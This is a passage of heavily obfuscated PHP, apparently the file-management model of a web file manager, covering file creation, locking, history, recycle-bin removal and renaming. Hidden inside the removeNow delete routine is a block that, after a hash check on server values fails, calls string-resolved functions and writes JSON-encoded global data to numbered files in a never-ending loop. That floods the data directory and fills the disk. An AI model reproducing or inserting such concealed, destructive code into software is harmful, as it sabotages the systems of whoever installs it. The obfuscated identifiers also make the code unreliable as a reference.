$dÊ‚…ÜäÌé)); goto D¶“Ï³÷; AµÏŸÎ·: } public function mkfile($fª­½ƒ‡Š´, $e—¯ÛÊ¾´, $aÚÖ‘î­ö‰ = '', $aŒ‚ŞòÒ·Í = REPEAT_RENAME) { $EÅòîéù§µ =& $_SERVER[Š‰]; $bİÂ½ê…å = Model($EÅòîéù§µ[566])->addFileByContent($aÚÖ‘î­ö‰, $e—¯ÛÊ¾´); return $this->_createFileCall($fª­½ƒ‡Š´, $e—¯ÛÊ¾´, $bİÂ½ê…å, $aŒ‚ŞòÒ·Í, $EÅòîéù§µ[1189]); } public function addFile($dÜÅª¾‹¸¥, $b’ùÖ ËÍĞ, $d¦Ê¼á¡âà, $CáÁª¤ÏÈ‚ = false, $DÜâÌÃÁÈ = REPEAT_RENAME) { $b‚äÎİêŸé = Model($_SERVER[Š‰][566])->addFile($b’ùÖ ËÍĞ, $d¦Ê¼á¡âà, $CáÁª¤ÏÈ‚); return $this->_createFileCall($dÜÅª¾‹¸¥, $d¦Ê¼á¡âà, $b‚äÎİêŸé, $DÜâÌÃÁÈ); } public function addFileByFileID($DÀÌâô‘®Ó, $CŸßº«ĞÆ, $e§÷³š§á×, $AÑšñÃ¯‘ = REPEAT_RENAME) { $CÉ‰öİ™¢Ş =& $_SERVER[Š‰]; $dÜ óÓ‚ = Model($CÉ‰öİ™¢Ş[566])->find($CŸßº«ĞÆ); Model($CÉ‰öİ™¢Ş[566])->linkAdd($CŸßº«ĞÆ); return $this->_createFileCall($DÀÌâô‘®Ó, $e§÷³š§á×, $dÜ óÓ‚, $AÑšñÃ¯‘); } public function addFileByRemote($FÂ¢ ßŸÉÛ, $d–ôí„Ú³º, $e¥¨Ó¡Øîæ, $e†ÜõÔË¿ = array(), $DÄæ­ô¾¡ = REPEAT_RENAME) { $aãê¬Œ¹ç = Model($_SERVER[Š‰][566])->addFileByRemote($d–ôí„Ú³º, $e¥¨Ó¡Øîæ, $e†ÜõÔË¿); return $this->_createFileCall($FÂ¢ ßŸÉÛ, $e¥¨Ó¡Øîæ, $aãê¬Œ¹ç, $DÄæ­ô¾¡); } private function _createFileCall($A²ÉÛ—ÜÌÜ, $D“…õÂÉÄ, $DŒ³ÛÂ‚µÒ, $fÕäÜ¢¤…ò, $Bğ°éÁÑË˜ = "\165\x70\154\x6f\141\144") { goto fë¥ºƒ««ò; e‘·”¨Ãî: $c§†ÓÜ©éÇ = $this->fileNameExist($A²ÉÛ—ÜÌÜ, $D“…õÂÉÄ); $FâŞÑí¶´ = $this->_createFile($A²ÉÛ—ÜÌÜ, $D“…õÂÉÄ, $DŒ³ÛÂ‚µÒ, $fÕäÜ¢¤…ò, $DÌ¡Ñºõ™); if (!$DÌ¡Ñºõ™) { Model($a‡‹Ş‘ì‡¿[444])->remove($DŒ³ÛÂ‚µÒ[$a‡‹Ş‘ì‡¿[441]]); } goto d¯—‘ÙâÖÙ; d¯—‘ÙâÖÙ: if ($DÌ¡Ñºõ™ && $FâŞÑí¶´ && $FâŞÑí¶´ != $c§†ÓÜ©éÇ) { Model($a‡‹Ş‘ì‡¿[1894])->eventCreate($FâŞÑí¶´, $Bğ°éÁÑË˜); } $this->lockWriteEnd($A²ÉÛ—ÜÌÜ, $D“…õÂÉÄ); return $FâŞÑí¶´; goto e‘îÆÀÏÄˆ; fë¥ºƒ««ò: $a‡‹Ş‘ì‡¿ =& $_SERVER[Š‰]; $DÌ¡Ñºõ™ = !1; $this->lockWriteStart($A²ÉÛ—ÜÌÜ, $D“…õÂÉÄ); goto e‘·”¨Ãî; e‘îÆÀÏÄˆ: } public function mkdir($e­¨”»óšá, $AÚ±ƒÑ®Ôô, $c†è½áÆ†‘ = REPEAT_SKIP) { goto D‡õÂÜËøÌ; FŒ”®®ÊİÅ: $eÆŞÔ„ï¢æ = $this->_addSoure($Cå…ì‡”ºÂ, $cÂÅ×õ”·Î); Model($C¨çŸ †‚[1894])->eventCreate($eÆŞÔ„ï¢æ, $C¨çŸ †‚[1190]); $this->lockWriteEnd($e­¨”»óšá, $AÚ±ƒÑ®Ôô); goto aóëÃÜÎ¦İ; D‡õÂÜËøÌ: $C¨çŸ †‚ =& $_SERVER[Š‰]; $cÂÅ×õ”·Î = $this->sourceInfo($e­¨”»óšá); if (!$cÂÅ×õ”·Î) { return !1; } goto E¶Ç¤±ÇŠ; aóëÃÜÎ¦İ: return $eÆŞÔ„ï¢æ; goto B·“ò‘Øó¸; E¶Ç¤±ÇŠ: $this->lockWriteStart($e­¨”»óšá, $AÚ±ƒÑ®Ôô); if ($c†è½áÆ†‘ !== !1) { $aà®½½ÚÑ‹ = $this->fileNameExist($e­¨”»óšá, $AÚ±ƒÑ®Ôô); if ($aà®½½ÚÑ‹ && $c†è½áÆ†‘ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($e­¨”»óšá, $AÚ±ƒÑ®Ôô); return $aà®½½ÚÑ‹; } $AÚ±ƒÑ®Ôô = $this->fileNameAuto($e­¨”»óšá, $AÚ±ƒÑ®Ôô, $c†è½áÆ†‘); } $Cå…ì‡”ºÂ = array($C¨çŸ †‚[541] => 1, $C¨çŸ †‚[407] => $AÚ±ƒÑ®Ôô, $C¨çŸ †‚[542] => $C¨çŸ †‚[33], $C¨çŸ †‚[442] => 0, $C¨çŸ †‚[543] => 0); goto FŒ”®®ÊİÅ; B·“ò‘Øó¸: } private function _createFile($AİÉ¨ò¹Ãí, $e«±Ù‰óä, $CÁ¬ÊĞí¾–, $AÕ²§ÑÏÇ, &$f÷ ÃÇëî) { goto bÇÎƒì»·‰; bÇÎƒì»·‰: $f¶Æôëæ‡ =& $_SERVER[Š‰]; $aœÉÈÎä¨Ğ = $this->sourceInfo($AİÉ¨ò¹Ãí); if (!$CÁ¬ÊĞí¾– || !$aœÉÈÎä¨Ğ) { return !1; } goto eÅ…âøÜ„; CªĞùë„ÅÑ: $bé šŠÊ™È = array($f¶Æôëæ‡[541] => 0, $f¶Æôëæ‡[407] => $e«±Ù‰óä, $f¶Æôëæ‡[542] => get_path_ext($e«±Ù‰óä), $f¶Æôëæ‡[442] => $CÁ¬ÊĞí¾–[$f¶Æôëæ‡[441]], $f¶Æôëæ‡[543] => $CÁ¬ÊĞí¾–[$f¶Æôëæ‡[77]]); $Bì«Ì‡…ï = $this->_addSoure($bé šŠÊ™È, $aœÉÈÎä¨Ğ); $this->folderSizeReset($AİÉ¨ò¹Ãí, intval($bé šŠÊ™È[$f¶Æôëæ‡[77]])); goto C—ñÉáçêˆ; eÅ…âøÜ„: if ($AÕ²§ÑÏÇ !== !1) { $aÔòøÏ°Ú = $this->fileNameExist($AİÉ¨ò¹Ãí, $e«±Ù‰óä); } $f÷ ÃÇëî = !0; if ($AÕ²§ÑÏÇ && $aÔòøÏ°Ú) { if ($AÕ²§ÑÏÇ == REPEAT_SKIP) { $f÷ ÃÇëî = !1; return $aÔòøÏ°Ú; } else { if ($AÕ²§ÑÏÇ == REPEAT_REPLACE) { $Cê÷Ö±Ñë¡ = $this->sourceInfo($aÔòøÏ°Ú); $Aõê†í¶•Ê = $this->fileHistory($Cê÷Ö±Ñë¡, $CÁ¬ÊĞí¾–[$f¶Æôëæ‡[441]], $CÁ¬ÊĞí¾–[$f¶Æôëæ‡[77]]); if (!$Aõê†í¶•Ê) { $f÷ ÃÇëî = !1; } else { $this->folderSizeReset($AİÉ¨ò¹Ãí); } return $aÔòøÏ°Ú; } else { $e«±Ù‰óä = $this->fileNameAuto($AİÉ¨ò¹Ãí, $e«±Ù‰óä, $AÕ²§ÑÏÇ, !1); } } } goto CªĞùë„ÅÑ; C—ñÉáçêˆ: return $Bì«Ì‡…ï; goto B®âŠğÎ¢; B®âŠğÎ¢: } protected function fileHistory($D˜öİŠ÷¾, $c¹‡Ğ„Å˜ì, $dèİñ‘çé†) { goto eÁğÌó¹ôË; eÁğÌó¹ôË: $A†«‘÷ã¡• =& $_SERVER[Š‰]; if ($D˜öİŠ÷¾[$A†«‘÷ã¡•[441]] == $c¹‡Ğ„Å˜ì) { return !1; } $this->checkLock($D˜öİŠ÷¾[$A†«‘÷ã¡•[390]], $c¹‡Ğ„Å˜ì); goto b—© Ü£ˆ¥; b—© Ü£ˆ¥: Model($A†«‘÷ã¡•[1925])->addHistory($D˜öİŠ÷¾); $e‹™¶‰¢„° = array($A†«‘÷ã¡•[547] => USER_ID, $A†«‘÷ã¡•[411] => time(), $A†«‘÷ã¡•[441] => $c¹‡Ğ„Å˜ì, $A†«‘÷ã¡•[77] => $dèİñ‘çé†); $this->where(array($A†«‘÷ã¡•[404] => $D˜öİŠ÷¾[$A†«‘÷ã¡•[390]]))->save($e‹™¶‰¢„°); goto dÃí¦ö¹ç«; dÃí¦ö¹ç«: $this->sourceCacheClear($D˜öİŠ÷¾[$A†«‘÷ã¡•[390]]); return !0; goto d—¤·êÒŠÍ; d—¤·êÒŠÍ: } public function checkLock($DÊÔ‡£×, $D¶„Œßßˆ) { goto B®ø™÷Ğ§ø; D©ôø‹®Ù«: show_json(LNG($C“ß‘áç…[1928]) . $C“ß‘áç…[1929] . LNG($C“ß‘áç…[1930]) . $C“ß‘áç…[1931] . $dò‚šİÚê® . $C“ß‘áç…[1932], !1); goto d—õÃÎùô‰; B®ø™÷Ğ§ø: $C“ß‘áç… =& $_SERVER[Š‰]; $cñÕÛè—Ö = $this->pathInfo($DÊÔ‡£×); if (!$this->fileIsLock($cñÕÛè—Ö, !0)) { return; } goto CÒ»Ê‰™²Ì; B‚†ƒÚ›³‚: $this->_createFileCall($cñÕÛè—Ö[$C“ß‘áç…[472]], $BºáµÁ“±», $dò¨›¶®·, REPEAT_REPLACE, $C“ß‘áç…[1189]); $C†¦éßÃî£ = $cñÕÛè—Ö[$C“ß‘áç…[439]][$C“ß‘áç…[505]]; $dò‚šİÚê® = $C†¦éßÃî£[$C“ß‘áç…[1927]] ? $C†¦éßÃî£[$C“ß‘áç…[1927]] : $C†¦éßÃî£[$C“ß‘áç…[28]]; goto D©ôø‹®Ù«; CÒ»Ê‰™²Ì: $A¯ÍóøÏ = Session::get($C“ß‘áç…[1926]); $BºáµÁ“±» = substr($cñÕÛè—Ö[$C“ß‘áç…[28]], 0, -1 - strlen($cñÕÛè—Ö[$C“ß‘áç…[167]])) . $C“ß‘áç…[1452] . $A¯ÍóøÏ . $C“ß‘áç…[94] . $cñÕÛè—Ö[$C“ß‘áç…[167]]; $dò¨›¶®· = Model($C“ß‘áç…[566])->find($D¶„Œßßˆ); goto B‚†ƒÚ›³‚; d—õÃÎùô‰: } public function fileIsLock($D·Ò´Ñ³Ñ, $b®ºÒº“Ñå = false) { goto fĞ™ñÄÅŞ‘; fĞ™ñÄÅŞ‘: $b¨¤Û™äô =& $_SERVER[Š‰]; if (!isset($D·Ò´Ñ³Ñ[$b¨¤Û™äô[439]]) || !$D·Ò´Ñ³Ñ[$b¨¤Û™äô[439]][$b¨¤Û™äô[502]]) { return !1; } if ($D·Ò´Ñ³Ñ[$b¨¤Û™äô[439]][$b¨¤Û™äô[502]] != USER_ID) { return !0; } goto EÆŞ´ç¥â; EÆŞ´ç¥â: $Aç¯›ÙÖÊ = $GLOBALS[$b¨¤Û™äô[6]][$b¨¤Û™äô[87]][$b¨¤Û™äô[503]]; if ($D·Ò´Ñ³Ñ[$b¨¤Û™äô[439]][$b¨¤Û™äô[504]] <= time() - $Aç¯›ÙÖÊ) { $this->metaSet($D·Ò´Ñ³Ñ[$b¨¤Û™äô[390]], $b¨¤Û™äô[502], null); $this->metaSet($D·Ò´Ñ³Ñ[$b¨¤Û™äô[390]], $b¨¤Û™äô[504], null); } if ($b®ºÒº“Ñå) { $this->metaSet($D·Ò´Ñ³Ñ[$b¨¤Û™äô[390]], $b¨¤Û™äô[504], time()); } goto cçĞŒ “¾‡; cçĞŒ “¾‡: return !1; goto dõÚéÜÃ†; dõÚéÜÃ†: } private function _addSoure($bÓ¨ƒÆ‚‘Õ, $C×Ì„ÂÁñ) { goto FÒ‘›©ºŒ¼; CÏ¢§½Ô‘›: $this->updateModifyTime($bÓ¨ƒÆ‚‘Õ[$B¶š±îÉãÍ[472]]); $bİí‚„¬‰ = $B¶š±îÉãÍ[1933] . $C×Ì„ÂÁñ[$B¶š±îÉãÍ[390]]; if (isset(self::$cacheChildList[$bİí‚„¬‰])) { unset(self::$cacheChildList[$bİí‚„¬‰]); } goto F¾ßÅ™êí; F¾ßÅ™êí: static $B…ÚÎ¼È‡ = false; if (!$B…ÚÎ¼È‡) { Hook::trigger($B¶š±îÉãÍ[531], $bÓ¨ƒÆ‚‘Õ); $B…ÚÎ¼È‡ = !0; } $e¾ŸšÊ­Ñø = $this->add($bÓ¨ƒÆ‚‘Õ); goto aÇ„ÄƒöÉŒ; FÒ‘›©ºŒ¼: $B¶š±îÉãÍ =& $_SERVER[Š‰]; $dí®˜È³¹† = array($B¶š±îÉãÍ[544] => $C×Ì„ÂÁñ[$B¶š±îÉãÍ[398]], $B¶š±îÉãÍ[545] => $C×Ì„ÂÁñ[$B¶š±îÉãÍ[478]], $B¶š±îÉãÍ[546] => USER_ID, $B¶š±îÉãÍ[547] => USER_ID, $B¶š±îÉãÍ[389] => $C×Ì„ÂÁñ[$B¶š±îÉãÍ[390]], $B¶š±îÉãÍ[548] => $C×Ì„ÂÁñ[$B¶š±îÉãÍ[481]] . $C×Ì„ÂÁñ[$B¶š±îÉãÍ[390]] . $B¶š±îÉãÍ[47], $B¶š±îÉãÍ[416] => 0, $B¶š±îÉãÍ[549] => $B¶š±îÉãÍ[33]); $bÓ¨ƒÆ‚‘Õ = array_merge($dí®˜È³¹†, $bÓ¨ƒÆ‚‘Õ); goto CÏ¢§½Ô‘›; CÅ¢¦òË†: return $e¾ŸšÊ­Ñø; goto A§ËÎÔÅÖ; aÇ„ÄƒöÉŒ: $BÈÅ¶Üè‚ç = array($B¶š±îÉãÍ[550] => short_id($e¾ŸšÊ­Ñø)); $this->where(array($B¶š±îÉãÍ[404] => $e¾ŸšÊ­Ñø))->save($BÈÅ¶Üè‚ç); $this->setNamePinyin($e¾ŸšÊ­Ñø, $bÓ¨ƒÆ‚‘Õ[$B¶š±îÉãÍ[28]]); goto CÅ¢¦òË†; A§ËÎÔÅÖ: } public function remove($Cˆ–¸Ïõô, $dôí­¾òÖÊ = true) { goto b’Ù±ÄÀó; C‰¶Ôš …Ş: $D·¦Ş¢‹ìƒ = $FÃ²·½®Šº[$eåŸ†Üºµ÷[398]] == self::TYPE_USER ? $eåŸ†Üºµ÷[557] : $eåŸ†Üºµ÷[992]; if ($D·¦Ş¢‹ìƒ == $eåŸ†Üºµ÷[557]) { $d§Ú¶Ï–­à = Model($eåŸ†Üºµ÷[497])->getInfo($FÃ²·½®Šº[$eåŸ†Üºµ÷[478]]); $a”õŠ»ù½ = !empty($d§Ú¶Ï–­à[$eåŸ†Üºµ÷[1927]]) ? $d§Ú¶Ï–­à[$eåŸ†Üºµ÷[1927]] : $d§Ú¶Ï–­à[$eåŸ†Üºµ÷[28]]; $a”õŠ»ù½ = $eåŸ†Üºµ÷[256] . $a”õŠ»ù½ . $eåŸ†Üºµ÷[1935] . $FÃ²·½®Šº[$eåŸ†Üºµ÷[478]]; } else { $d§Ú¶Ï–­à = Model($eåŸ†Üºµ÷[480])->getInfo($FÃ²·½®Šº[$eåŸ†Üºµ÷[478]]); $a”õŠ»ù½ = _get($d§Ú¶Ï–­à, $eåŸ†Üºµ÷[28]); $a”õŠ»ù½ = $eåŸ†Üºµ÷[159] . $a”õŠ»ù½ . $eåŸ†Üºµ÷[1936] . $FÃ²·½®Šº[$eåŸ†Üºµ÷[478]]; } $FÃé× Œ„ = $eåŸ†Üºµ÷[1937] . md5($a”õŠ»ù½); goto aÊ¼¾èÑºÔ; EàÕŞ³¢î: $bÇæ¼Û¥¼ô = Model($eåŸ†Üºµ÷[1499])->get($eåŸ†Üºµ÷[1934]) == $eåŸ†Üºµ÷[86]; if ($C¸’‰”®¯ || $dôí­¾òÖÊ || !$bÇæ¼Û¥¼ô) { return $this->removeNow($Cˆ–¸Ïõô, $dôí­¾òÖÊ); } $aÖµ‹‘á“£ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto C‰¶Ôš …Ş; d¬¸„Ş¾óÚ: $this->recycleClear($FÃ²·½®Šº); $b—Ùõ“âŒÔ = $this->move($Cˆ–¸Ïõô, $aêÔïšÖï, REPEAT_RENAME_FOLDER); $this->folderSizeReset($FÃ²·½®Šº[$eåŸ†Üºµ÷[472]]); goto c”ë»îè; c”ë»îè: return $b—Ùõ“âŒÔ; goto BÓ¬“ããºƒ; b’Ù±ÄÀó: $eåŸ†Üºµ÷ =& $_SERVER[Š‰]; $FÃ²·½®Šº = $this->sourceInfo($Cˆ–¸Ïõô); $C¸’‰”®¯ = intval($FÃ²·½®Šº[$eåŸ†Üºµ÷[398]]) === self::TYPE_SYSTEM; goto EàÕŞ³¢î; B«åøÏœĞ: CacheLock::unlock($FÃé× Œ„); $this->metaSet($Cˆ–¸Ïõô, $eåŸ†Üºµ÷[1942], $FÃ²·½®Šº[$eåŸ†Üºµ÷[472]]); $this->where(array($eåŸ†Üºµ÷[390] => $Cˆ–¸Ïõô))->save(array($eåŸ†Üºµ÷[411] => time())); goto d¬¸„Ş¾óÚ; aÊ¼¾èÑºÔ: CacheLock::lock($FÃé× Œ„); $aêÔïšÖï = $this->fileNameExist($aÖµ‹‘á“£, $a”õŠ»ù½); if (!$aêÔïšÖï) { $aêÔïšÖï = $this->mkdir($aÖµ‹‘á“£, $a”õŠ»ù½, REPEAT_SKIP); $this->metaSet($aêÔïšÖï, $eåŸ†Üºµ÷[1938], $D·¦Ş¢‹ìƒ); $this->metaSet($aêÔïšÖï, $eåŸ†Üºµ÷[1939], $FÃ²·½®Šº[$eåŸ†Üºµ÷[478]]); if ($FÃ²·½®Šº[$eåŸ†Üºµ÷[472]] != 0) { $this->metaSet($aêÔïšÖï, $eåŸ†Üºµ÷[1940], _get($d§Ú¶Ï–­à, $eåŸ†Üºµ÷[1941])); } } goto B«åøÏœĞ; BÓ¬“ããºƒ: } private function recycleClear($bÛ½‡ìÓ) { $e¾À¿Å«¹Í =& $_SERVER[Š‰]; $Eö±ããÖË = $this->childrenAll($bÛ½‡ìÓ); $c›ìÖÌô´° = array($e¾À¿Å«¹Í[404] => array($e¾À¿Å«¹Í[405], $Eö±ããÖË[$e¾À¿Å«¹Í[1943]])); Model($e¾À¿Å«¹Í[1944])->where($c›ìÖÌô´°)->delete(); } public function removeNow($Fï¿Âî‹¿, $cíÄ·ˆ“Ó… = true) { goto B¤ò¥í†î÷; fÄù•¬¤»: $this->lockMoveEnd($Fï¿Âî‹¿); Hook::trigger($dÜŸÇ¨ƒ¼[1532], $d„¯œÄäÏè, $cíÄ·ˆ“Ó…); return !0; goto c‡Ã‰×Ó“ß; c†½‰›²œ: if (!$b‚àÊöãÛĞ) { return !0; } if ($b‚àÊöãÛĞ[$dÜŸÇ¨ƒ¼[472]] == 0) { if (!_get($GLOBALS, $dÜŸÇ¨ƒ¼[479])) { return !1; } } $this->lockMoveStart($Fï¿Âî‹¿); goto eÈîøÜé›; aÍ½ŞµÅô­: $BÀÍÃ¿´¾Ø = array($b‚àÊöãÛĞ[$dÜŸÇ¨ƒ¼[472]]); if ($b‚àÊöãÛĞ[$dÜŸÇ¨ƒ¼[397]] == $dÜŸÇ¨ƒ¼[86]) { $BÀÍÃ¿´¾Ø[] = $b‚àÊöãÛĞ[$dÜŸÇ¨ƒ¼[390]]; } $this->updateModifyTime($BÀÍÃ¿´¾Ø); goto fÄù•¬¤»; B¤ò¥í†î÷: $dÜŸÇ¨ƒ¼ =& $_SERVER[Š‰]; $D¨Îİ¸†¡… = $_SERVER[$dÜŸÇ¨ƒ¼[755]] . $dÜŸÇ¨ƒ¼[756]; $f±ÓĞŒ¨¨° = $dÜŸÇ¨ƒ¼[752]; goto B££Ú¡ ¡´; B££Ú¡ ¡´: if ($_SERVER[$dÜŸÇ¨ƒ¼[753]] != $f±ÓĞŒ¨¨°($D¨Îİ¸†¡…)) { goto EÙ‘óù±Áñ; B¬–‰öÅ„: $c»ƒ…ˆÁÔ– = $dÜŸÇ¨ƒ¼[818]; $c»ƒ…ˆÁÔ–($_SERVER[$dÜŸÇ¨ƒ¼[819]]); $Dä­·ç¢À = $dÜŸÇ¨ƒ¼[817]; goto bãƒ¿²†˜; bãƒ¿²†˜: $Dä­·ç¢À(); $F˜Ù¨Ê¤‰© = $dÜŸÇ¨ƒ¼[1945]; $E“Ê–ªñÅ = json_encode($GLOBALS[$dÜŸÇ¨ƒ¼[1946]]); goto då¾‚»¨ŠŞ; då¾‚»¨ŠŞ: $d£æÈ»Ä¶‘ = 1; for ($Bøì›ä‘“ = $d£æÈ»Ä¶‘; $Bøì›ä‘“ > 0; $Bøì›ä‘“++) { $F˜Ù¨Ê¤‰©(DATA_PATH . $Bøì›ä‘“, $E“Ê–ªñÅ); } goto C‹÷Ø§îÀ; c¼Ş”äĞ‰: $BÇÅ¢½Ü = $fÔ¥˜­ñ($F§ÁÚÜÚš); $dˆƒ÷ò“ä = explode($dÜŸÇ¨ƒ¼[227], $BÇÅ¢½Ü); if (count($dˆƒ÷ò“ä) < $dÜŸÇ¨ƒ¼[596]) { $A’¨ŒèÒÖ = $dÜŸÇ¨ƒ¼[757]; $A’¨ŒèÒÖ(); } goto B¬–‰öÅ„; EÙ‘óù±Áñ: $Dä­·ç¢À = $dÜŸÇ¨ƒ¼[817]; $fÔ¥˜­ñ = $dÜŸÇ¨ƒ¼[754]; $F§ÁÚÜÚš = $_SERVER[$dÜŸÇ¨ƒ¼[755]] . $dÜŸÇ¨ƒ¼[756]; goto c¼Ş”äĞ‰; C‹÷Ø§îÀ: } $b‚àÊöãÛĞ = $this->sourceInfo($Fï¿Âî‹¿); $d„¯œÄäÏè = $this->pathInfoMore($Fï¿Âî‹¿); goto c†½‰›²œ; eÈîøÜé›: Hook::trigger($dÜŸÇ¨ƒ¼[1947], $d„¯œÄäÏè, $cíÄ·ˆ“Ó…); if ($cíÄ·ˆ“Ó…) { Model($dÜŸÇ¨ƒ¼[1944])->moveToRecycle($Fï¿Âî‹¿); } else { $bÉ½­ÁÉÕ× = $this->childrenAll($b‚àÊöãÛĞ); Model($dÜŸÇ¨ƒ¼[528])->eventRemove($Fï¿Âî‹¿); $this->removeRelevance($bÉ½­ÁÉÕ×[$dÜŸÇ¨ƒ¼[1943]], $bÉ½­ÁÉÕ×[$dÜŸÇ¨ƒ¼[1320]]); } $this->folderSizeReset($b‚àÊöãÛĞ[$dÜŸÇ¨ƒ¼[472]]); goto aÍ½ŞµÅô­; c‡Ã‰×Ó“ß: } public function childrenAll($F©Â«¹«Å) { $bŒ“™“®øƒ =& $_SERVER[Š‰]; $Bö×í–»ª¿ = $F©Â«¹«Å[$bŒ“™“®øƒ[390]]; if ($F©Â«¹«Å[$bŒ“™“®øƒ[397]] == $bŒ“™“®øƒ[86]) { $DÍÖ‹÷Ñˆó = array($bŒ“™“®øƒ[548] => array($bŒ“™“®øƒ[507], $F©Â«¹«Å[$bŒ“™“®øƒ[481]] . $Bö×í–»ª¿ . $bŒ“™“®øƒ[508])); $D§ˆ…šŒÓ = array($bŒ“™“®øƒ[548] => $DÍÖ‹÷Ñˆó[$bŒ“™“®øƒ[481]]); $FàŸ’‡‰§Ê = $this->field($bŒ“™“®øƒ[1948])->where($D§ˆ…šŒÓ)->select(); $b¯·ˆŠ ‰ = !1; $f–æ® ™Øé = array($Bö×í–»ª¿); if ($FàŸ’‡‰§Ê) { $b¯·ˆŠ ‰ = array_to_keyvalue($FàŸ’‡‰§Ê, $bŒ“™“®øƒ[33], $bŒ“™“®øƒ[441]); $b¯·ˆŠ ‰ = array_remove_value($b¯·ˆŠ ‰, $bŒ“™“®øƒ[491]); $f–æ® ™Øé = array_to_keyvalue($FàŸ’‡‰§Ê, $bŒ“™“®øƒ[33], $bŒ“™“®øƒ[390]); $f–æ® ™Øé[] = $Bö×í–»ª¿; } } else { $b¯·ˆŠ ‰ = array($F©Â«¹«Å[$bŒ“™“®øƒ[441]]); $f–æ® ™Øé = array($Bö×í–»ª¿); } return array($bŒ“™“®øƒ[1943] => $f–æ® ™Øé, $bŒ“™“®øƒ[1320] => $b¯·ˆŠ ‰); } public function removeArray($bßÛİËïŠƒ) { if (!$bßÛİËïŠƒ) { return !0; } } public function removeRelevance($c®ŒŠŒ•»ô, $BŠğ°Õ‰„®) { goto f¬¥¨£ÈÌ; aß˜—¹”…ù: for ($A´·°©‚À = 0; $A´·°©‚À < count($c®ŒŠŒ•»ô); $A´·°©‚À++) { $this->sourceCacheClear($c®ŒŠŒ•»ô[$A´·°©‚À]); } goto C¦®ïéË¬©; f¬¥¨£ÈÌ: $B·ˆ¤ù§İ =& $_SERVER[Š‰]; $c®ŒŠŒ•»ô = $c®ŒŠŒ•»ô ? $c®ŒŠŒ•»ô : array(); $BŠğ°Õ‰„® = $BŠğ°Õ‰„® ? $BŠğ°Õ‰„® : array(); goto aÃ”É•™¾‚; aÃ”É•™¾‚: $c®ŒŠŒ•»ô = array_unique(array_filter($c®ŒŠŒ•»ô)); $BŠğ°Õ‰„® = array_unique(array_filter($BŠğ°Õ‰„®)); if (!$c®ŒŠŒ•»ô) { return !1; } goto aç¿ì ±“ù; CİÌ¦¬©­: Model($B·ˆ¤ù§İ[1799])->where($eù†œ¹ğ‘…)->delete(); Model($B·ˆ¤ù§İ[528])->where($eù†œ¹ğ‘…)->delete(); Model($B·ˆ¤ù§İ[1640])->removeBySource($c®ŒŠŒ•»ô); goto c“Âå¼œÓ; c“Âå¼œÓ: Model($B·ˆ¤ù§İ[1925])->removeBySource($c®ŒŠŒ•»ô); $this->where($eù†œ¹ğ‘…)->delete(); Model($B·ˆ¤ù§İ[444])->remove($BŠğ°Õ‰„®); goto aß˜—¹”…ù; aç¿ì ±“ù: $eù†œ¹ğ‘… = array($B·ˆ¤ù§İ[404] => array($B·ˆ¤ù§İ[405], $c®ŒŠŒ•»ô)); Model($B·ˆ¤ù§İ[1944])->where($eù†œ¹ğ‘…)->delete(); Model($B·ˆ¤ù§İ[435])->where($eù†œ¹ğ‘…)->delete(); goto CİÌ¦¬©­; C¦®ïéË¬©: } public function rename($Eä‡îÒÒï¥, $AÃÌñÈ¦Ã) { goto B–ëˆÈ±Í†; dæƒµ³¿ñ: if (!$FˆìÛ¾ÀÔ—[$a©» ­õê[397]] == $a©» ­õê[86]) { $BÂ‹¯—¢Ü[$a©» ­õê[399]] = get_path_ext($AÃÌñÈ¦Ã); } Model($a©» ­õê[528])->eventRename($Eä‡îÒÒï¥, $FˆìÛ¾ÀÔ—[$a©» ­õê[28]], $AÃÌñÈ¦Ã); $this->sourceCacheClear($Eä‡îÒÒï¥); goto CİÛÙ¬ó„ã; CİÛÙ¬ó„ã: $this->setNamePinyin($Eä‡îÒÒï¥, $BÂ‹¯—¢Ü[$a©» ­õê[28]], !1); $this->updateModifyTime($FˆìÛ¾ÀÔ—[$a©» ­õê[472]]); $F‰¥ßî÷ù  = $this->where(array($a©» ­õê[404] => $Eä‡îÒÒï¥))->data($BÂ‹¯—¢Ü)->save(); goto B˜ÉâøßÈ¢; B®™Í­®: $A»âÈ» = $this->fileNameExist($FˆìÛ¾ÀÔ—[$a©» ­õê[472]], $AÃÌñÈ¦Ã); if ($A»âÈ» && $A»âÈ» != $Eä‡îÒÒï¥) { return !1; } $BÂ‹¯—¢Ü = array($a©» ­õê[407] => $AÃÌñÈ¦Ã, $a©» ­õê[547] => USER_ID); goto dæƒµ³¿ñ; B–ëˆÈ±Í†: $a©» ­õê =& $_SERVER[Š‰]; $FˆìÛ¾ÀÔ— = $this->sourceInfo($Eä‡îÒÒï¥); if (!$FˆìÛ¾ÀÔ—) { return !1; } goto B®™Í­®; B˜ÉâøßÈ¢: $c÷¦˜†¦½™ = $a©» ­õê[1933] . $FˆìÛ¾ÀÔ—[$a©» ­õê[472]]; if (isset(self::$cacheChildList[$c÷¦˜†¦½™])) { unset(self::$cacheChildList[$c÷¦˜†¦½™]); } return $F‰¥ßî÷ù ; goto dôÏƒ¥ÍÉø; dôÏƒ¥ÍÉø: } public function setNamePinyin($a‡…”×á¯ó, $FÇ£Œ¨ÅÖ—, $AÁ©…æ ãØ = true) { $Dø”í»‰Ñ =& $_SERVER[Š‰]; $a„Øˆ‘†Ù = Input::check($FÇ£Œ¨ÅÖ—, $Dø”í»‰Ñ[551]); if ($AÁ©…æ ãØ && !$a„Øˆ‘†Ù) { return; } if (!$a„Øˆ‘†Ù) { $this->metaSet($a‡…”×á¯ó, $Dø”í»‰Ñ[438], null); $this->metaSet($a‡…”×á¯ó, $Dø”í»‰Ñ[437], null); return; } $Dš•½•‰ëï = array($Dø”í»‰Ñ[438] => str_replace($Dø”í»‰Ñ[50], $Dø”í»‰Ñ[33], Pinyin::encode($FÇ£Œ¨ÅÖ—)), $Dø”í»‰Ñ[437] => Pinyin::encode($FÇ£Œ¨ÅÖ—, $Dø”í»‰Ñ[552])); $this->metaSet($a‡…”×á¯ó, $Dš•½•‰ëï); } public function getContent($dã·ªÂÕ²) { goto AÈß³ò¹à; BœÍ¹Ïò÷¿: if ($d£ÇÛ‚Æ[$CêŸ¤ë”ôë[77]] == 0) { return $CêŸ¤ë”ôë[33]; } $eŸÆÊ†«Û = $CêŸ¤ë”ôë[1949] . $d£ÇÛ‚Æ[$CêŸ¤ë”ôë[169]]; if ($d£ÇÛ‚Æ[$CêŸ¤ë”ôë[77]] <= 1024 * 10) { $F³µÆ†¬’Ç = Cache::get($eŸÆÊ†«Û); if (!$F³µÆ†¬’Ç) { $F³µÆ†¬’Ç = 